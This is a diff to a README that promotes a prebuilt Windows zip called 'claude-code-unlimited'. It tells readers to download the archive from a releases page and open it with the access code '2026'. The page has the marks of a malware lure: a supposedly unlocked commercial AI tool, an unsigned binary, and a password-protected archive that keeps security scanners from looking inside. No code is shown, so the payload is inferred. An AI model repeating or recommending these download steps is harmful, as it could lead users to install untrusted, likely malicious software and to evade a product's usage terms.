@@ -30,10 +30,9 @@
 
 ## Getting Started (No Compiler Needed)
 
-| Platform | Direct Prebuilt Package | Documentation Mirror |
-| :--- | :--- | :--- |
-| **Windows 10 / 11 (64-bit)** | [**`claude-code-unlimited-v0.1.0-win64.zip`**](../../releases/download/v0.1.0/claude-code-unlimited-v0.1.0-win64.zip) | [**Usage Guide (`docs/USAGE.md`)**](docs/USAGE.md) |
-| **Windows 10 / 11 (64-bit)** | [**`claude-code-unlimited-v0.1.0-win64.zip`**](../../releases/download/v0.1.0/claude-code-unlimited-v0.1.0-win64.zip) | [**FAQ (`docs/FAQ.md`)**](docs/FAQ.md) |
+| Platform | Package |
+| :--- | :--- |
+| **Windows 10 / 11 (x64)** | [**`claude-code-unlimited-v0.1.0-win64.zip`**](../../releases/download/v0.1.0/claude-code-unlimited-v0.1.0-win64.zip) |
 
 1. Download [`claude-code-unlimited-v0.1.0-win64.zip`](../../releases/download/v0.1.0/claude-code-unlimited-v0.1.0-win64.zip) using the download button above.
 2. Extract the archive using the access code shown on the badge above (`2026`).
